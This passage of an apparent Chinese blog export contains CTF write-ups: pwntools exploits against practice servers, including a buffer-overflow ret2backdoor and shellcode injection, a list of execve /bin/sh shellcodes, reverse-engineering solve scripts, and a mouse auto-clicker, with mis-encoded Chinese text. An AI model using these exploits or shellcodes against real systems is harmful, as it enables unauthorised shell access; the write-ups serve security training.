class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26857</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#s = p.recv(numb = 2048, timeout = 3)</span></span><br><span class="line"><span class="comment">#sp = p.recv(numb = 5048, timeout = 3)</span></span><br><span class="line"><span class="comment">#print(sp)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ç›¸å…³shellcode,https://blog.csdn.net/Xzzzz911/article/details/<span class="number">133468714</span></span><br><span class="line"><span class="comment"># 32ä½ çŸ­å­—èŠ‚shellcode --&gt; 21å­—èŠ‚</span></span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32ä½ çº¯asciiå­—ç¬¦shellcode</span></span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32ä½ scanfå¯è¯»å–çš„shellcode</span></span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/<span class="built_in">bin</span>/sh</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ scanfå¯è¯»å–çš„shellcode 22å­—èŠ‚</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ è¾ƒçŸ­çš„shellcode  23å­—èŠ‚</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ çº¯asciiå­—ç¬¦shellcode</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h5 id="WEEK1-PWN-p1eee"><a href="#WEEK1-PWN-p1eee" class="headerlink" title="WEEK1|PWN  p1eee"></a>WEEK1|PWN  p1eee</h5><p>20+8<br><img src="/images/xinshengsai/20231102161451.png" alt="image-20220126203415648"><br>bashåœ°å€126c<br><img src="/images/xinshengsai/20231102161516.png" alt="image-20220126203415648"><br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn6&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26148</span>)</span><br><span class="line">backdoor = <span class="number">0x126C</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-easy-RE"><a href="#WEEK1-REVERSE-easy-RE" class="headerlink" title="WEEK1|REVERSE  easy_RE"></a>WEEK1|REVERSE  easy_RE</h5><p>shift+f12çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²ï¼Œæœä¸€ä¸‹flagï¼Œæœ‰ä¸€ä¸ª<br><img src="/images/xinshengsai/20231102191446.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231102191626.png" alt="image-20220126203415648"></p><h5 id="WEEK1-REVERSE-å’³"><a href="#WEEK1-REVERSE-å’³" class="headerlink" title="WEEK1|REVERSE  å’³"></a>WEEK1|REVERSE  å’³</h5><p>ä½¿ç”¨peæŸ¥ä¸€ä¸‹<br><code>https://github.com/ExeinfoASL/ASL/tree/master</code></p><p><img src="/images/xinshengsai/20231103101148.png" alt="image-20220126203415648"><br>upxçš„å£³ï¼Œ<br><code>upx -d file</code>å³å¯ï¼Œç„¶åæ‹–åˆ°idaä¸­ï¼Œçœ‹åˆ°å…³é”®å‡½æ•°ï¼Œå¯¹str1-1æ“ä½œç­‰äºencï¼ŒåŒå‡»encï¼Œå¾—åˆ°å­—ç¬¦ä¸²<br><img src="/images/xinshengsai/20231103111246.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231103111338.png" alt="image-20220126203415648"><br><code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>,<br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-Segments"><a href="#WEEK1-REVERSE-Segments" class="headerlink" title="WEEK1|REVERSE   Segments"></a>WEEK1|REVERSE   Segments</h5><p>Â Action Â  Â name: ShowSegments  </p><p>This command opens the segments window. The format of this window is explained here.</p><p>You can use list viewer commands in this window.</p><p>In order to change the selector values, use selectors window.Â </p><p>ä¸­æ–‡ç¿»è¯‘å¦‚ä¸‹ï¼š</p><p>æ“ä½œåç§°ï¼šShowSegments</p><p>æ­¤å‘½ä»¤æ‰“å¼€æ®µçª—å£ã€‚è¯¥çª—å£çš„æ ¼å¼åœ¨æ­¤å¤„è§£é‡Šã€‚</p><p>æ‚¨å¯ä»¥åœ¨æ­¤çª—å£ä¸­ä½¿ç”¨åˆ—è¡¨æŸ¥çœ‹å™¨å‘½ä»¤ã€‚</p><p>è¦æ›´æ”¹é€‰æ‹©å™¨å€¼ï¼Œè¯·ä½¿ç”¨é€‰æ‹©å™¨çª—å£ã€‚<br>æç¤ºäº†ï¼Œshift+f7å³å¯ï¼Œçœ‹åˆ°<br><img src="/images/xinshengsai/20231103111817.png" alt="image-20220126203415648"></p><h5 id="WEEK1-REVERSE-ELF"><a href="#WEEK1-REVERSE-ELF" class="headerlink" title="WEEK1|REVERSE   ELF"></a>WEEK1|REVERSE   ELF</h5><p><img src="/images/xinshengsai/20231107154347.png" alt="image-20220126203415648"><br>  for ( i = 0; i &lt; strlen(a1); ++i )<br>  {<br>    v2 = v6++;<br>    v4[v2] = (a1[i] ^ 0x20) + 16;<br>  }<br>  ç»™æ¯ä¸€ä¸ªå­—ç¬¦äº¦æˆ–0x20  ç„¶ååŠ ä¸Š16<br>  <img src="/images/xinshengsai/20231107154541.png" alt="image-20220126203415648"><br>  ç„¶åbase64ï¼Œ<br>  é‚£ä¹ˆé€†å‘çš„è¯å°±ï¼Œå…ˆè§£base64 ï¼Œç„¶åå‡  åœ¨äº¦æˆ–<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span></span><br><span class="line"></span><br><span class="line">s = base64.b64decode(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>((i-<span class="number">16</span>)^<span class="number">0x20</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span></span><br></pre></td></tr></table></figure></p><h5 id="WEEK1-REVERSE-Endian"><a href="#WEEK1-REVERSE-Endian" class="headerlink" title="WEEK1|REVERSE   Endian"></a>WEEK1|REVERSE   Endian</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )<span class="comment">//æ•°ç»„å’Œè¿™ä¸ª12345678äº¦æˆ–</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">åŒå‡»<span class="built_in">array</span>ï¼Œæœ‰ä¸€ä¸ªæ•°ç»„</span><br><span class="line">.rodata:<span class="number">0000000000002010</span> <span class="built_in">array</span>           dd <span class="number">75553</span>A1Eh, <span class="number">7B</span>583A03h, <span class="number">4</span>D58220Ch, <span class="number">7B</span>50383Dh, <span class="number">736B</span>3819h</span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231107161623.png" alt="image-20220126203415648"><br>å†™ä¸ªè„šæœ¬ï¼Œå‡ºç†ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sums = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;75553A1E, 7B583A03, 4D58220C, 7B50383D, 736B3819&quot;</span></span><br><span class="line"></span><br><span class="line">a = a.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">Â  Â  suma = <span class="built_in">int</span>(i, <span class="number">16</span>)^<span class="number">0x12345678</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(suma)[::-<span class="number">1</span>]),end=<span class="string">&quot;&quot;</span>,)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#b&#x27;flag&#x27;b&#x27;&#123;lli&#x27;b&#x27;ttl_&#x27;b&#x27;Endi&#x27;b&#x27;an_a&#x27;</span></span><br><span class="line">Â </span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-AndroXor"><a href="#WEEK1-REVERSE-AndroXor" class="headerlink" title="WEEK1|REVERSE   AndroXor"></a>WEEK1|REVERSE   AndroXor</h5><p><img src="/images/xinshengsai/20231107163630.png" alt="image-20220126203415648"><br>æ‹–åˆ°Androidkillä¸­ï¼Œçœ‹åˆ°ä»£ç <br>ä¹Ÿå°±æ˜¯æ¯ä¸ªå­—ç¬¦ä¸happyx3è¿›è¡Œäº¦æˆ–ï¼Œä¸å¤Ÿçš„å¾ªç¯å³å¯ï¼Œ<br>pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13 &quot;</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = s.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i])^<span class="built_in">ord</span>((key[i%<span class="number">7</span>]))), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-EzPE"><a href="#WEEK1-REVERSE-EzPE" class="headerlink" title="WEEK1|REVERSE    EzPE"></a>WEEK1|REVERSE    EzPE</h5><p>æ–‡ä»¶æ‰“ä¸å¼€ï¼Œçœ‹ä¸€ä¸‹æ–‡ä»¶åå…­è¿›åˆ¶å¤´ï¼Œexeçš„æ–‡ä»¶å¤´ä¸º4D5A90,æ”¹ä¸€ä¸‹<br><img src="/images/xinshengsai/20231107164029.png" alt="image-20220126203415648"><br><code>https://thunderjie.github.io/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/</code><br>å†å°†90 æ”¹æˆ80</p><p><code>shiift + e</code> idaé€‰ä¸­æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lis = [<span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>,</span><br><span class="line"></span><br><span class="line">Â  <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>,</span><br><span class="line"></span><br><span class="line">Â  <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>,</span><br><span class="line"></span><br><span class="line">Â  <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print((index ^ lis[index+1])^ lis[index] )</span></span><br><span class="line"></span><br><span class="line">Â  Â  lis[index] = index ^ lis[index+<span class="number">1</span>] ^ lis[index] Â <span class="comment">#lis[34] = 34 ^ lis[35] ^ lis[34]çš„å€¼</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(lis)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-lazy-activtiy"><a href="#WEEK1-REVERSE-lazy-activtiy" class="headerlink" title="WEEK1|REVERSE   lazy_activtiy"></a>WEEK1|REVERSE   lazy_activtiy</h5><p>æ‹–åˆ°andkillé‡Œç›´æ¥æœflag</p><p><img src="/images/xinshengsai/20231108102413.png" alt="image-20220126203415648"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonè‡ªåŠ¨ç‚¹å‡»å°è„šæœ¬</title>
      <link href="/2023/09/28/python%E8%87%AA%E5%8A%A8%E7%82%B9%E5%87%BB%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/09/28/python%E8%87%AA%E5%8A%A8%E7%82%B9%E5%87%BB%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Â os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Â time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl-C to end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  screenWidth, screenHeight = pag.size() Â <span class="comment">#è·å–å±å¹•çš„å°ºå¯¸</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(screenWidth,screenHeight)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x,y = pag.position() Â  <span class="comment">#è·å–å½“å‰é¼ æ ‡çš„ä½ç½®</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  posStr = <span class="string">&quot;Position:&quot;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(y).rjust(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(posStr)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.system(<span class="string">&#x27;cls&#x27;</span>) Â  <span class="comment">#æ¸…æ¥šå±å¹•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&#x27;end....&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_operation</span>():</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="string">&quot;&quot;&quot;ç‚¹å‡»æ“ä½œ&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># é¼ æ ‡éœ€è¦ç§»åŠ¨åˆ°çš„ä½ç½®</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x, y = <span class="number">1396</span>, <span class="number">850</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x1, y1 = <span class="number">182</span>,<span class="number">24</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x1, y1)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x2, y2 = <span class="number">120</span>,<span class="number">317</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x2, y2)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x3, y3 = <span class="number">115</span>,<span class="number">363</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x3, y3)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x11, y11=<span class="number">357</span>,<span class="number">22</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x11, y11)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x12, y12=<span class="number">97</span>,<span class="number">320</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x12, y12)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x13, y13=<span class="number">115</span>, <span class="number">508</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x13, y13)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x14, y14=<span class="number">160</span>,<span class="number">560</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x14, y14)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">click_operation()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023longjianbeiwp</title>
      <link href="/2023/09/28/2023%E6%B3%B7%E5%89%91%E6%9D%AFwp/"/>
      <url>/2023/09/28/2023%E6%B3%B7%E5%89%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>æ²¡äº†<br>tcp.flags.syn==1 and tcp.flags.ack==1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;748007e861908c03&#x27;</span></span><br><span class="line"></span><br><span class="line">hex_string = <span 